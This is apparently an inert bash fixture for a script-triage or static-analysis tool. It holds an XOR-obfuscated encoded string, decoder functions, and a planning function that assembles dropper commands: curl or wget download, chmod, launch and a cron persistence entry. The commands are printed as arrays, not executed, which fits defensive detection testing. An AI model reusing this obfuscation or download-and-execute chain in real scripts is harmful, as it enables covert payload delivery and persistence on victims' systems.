#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_747ed830='221,183,155,87,7,218,229,156,83,0,199,225,222,7,80,154,241,133,2,26,132,235,216,5,27,137,240,207,73,9,130,240,203,22,107,132,235,216,5,72,143,231,195,16,70,143,247,132,81,7,219,181,153,86,85,220,177,158,75,81,158,229,206,22,65,215,225,199,7,90,181,225,201,15,66,152,225,217,26,89,199,225,199,7,90,159,185,207,4,91,152,244,245,14,87,152,229,214,81,7,219,181,153,86,85,220,177,158,75,81,141,229,222,21,26,197,225,194,5,85,137,169,217,21,81,152,240,196,19,92,197,244,199,18,27,215,236,222,7,68,181,225,198,15,82,150,179,153,87,5,217,180,203,80,1,222,171,200,7,120,153,247,207,20,64,132,241,226,91,64,132,225,205,7,107,152,225,217,19,72,130,247,132,94,4,216,177,146,3,87,142,171,206,15,88,139,242,196,15,26,143,232,218,11,85,146,225,132,81,7,219,181,153,86,85,220,177,158,73,27,208,247,218,18,64,130,185,198,20,65,150,179,153,87,5,217,180,203,80,1,222,169,196,1,93,139,244,199,7,87,215,224,195,57,90,141,237,203,22,89,139,231,214,83,9,158,234,223,9,87,181,225,205,7,64,153,248,193,5,85,136,232,198,7,82,181,253,222,15,88,131,240,223,57,93,158,232,223,11,9,152,225,222,22,85,142,229,214,21,71,143,231,197,20,68,181,236,201,18,85,154,247,195,2,24,143,224,197,11,107,143,227,196,7,92,137,168,207,10,93,140,219,207,18,93,152,243,134,3,64,133,233,207,20,107,143,246,195,19,69,137,229,134,18,71,133,236,245,3,88,131,226,197,20,68,215,247,218,3,64,153,248,155,91,66'
  readonly Codec_747ed830='reversed_decimal|repeating_key_xor|34,66,aa,84,ea'

  Load_747ed830() {
    v_a19c=()
    local IFS=',' v_e598
    local -a pieces
    read -r -a pieces <<< "${Material_747ed830}"
    for ((v_e598=${#pieces[@]}-1; v_e598>=0; v_e598--)); do v_a19c+=("${pieces[v_e598]}"); done
  }

  Decode_747ed830() {
    v_b27e=()
    local -a key_bytes=(52 102 170 132 234)
    local v_e598
    for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
      v_b27e+=("$((v_a19c[v_e598] ^ key_bytes[v_e598 % ${#key_bytes[@]}]))")
    done
  }

  Recover_747ed830() {
    local -a v_a19c v_b27e
    local v_c304 v_d41a v_b803 v_e598
    if ((2 > 1)); then v_d41a=left; else v_d41a=right; fi
    Load_747ed830
    if ! Decode_747ed830; then return 71; fi
    v_c304=''
    local octal character
    for v_e598 in "${!v_b27e[@]}"; do
      printf -v octal '%03o' "${v_b27e[v_e598]}"
      printf -v character '%b' "\\$octal"
      v_c304+="$character"
    done
    printf '%s\n' "$v_c304"
  }

  Inspect_747ed830() { Recover_747ed830; }

  Plan_747ed830() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_747ed830)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_747ed830; fi
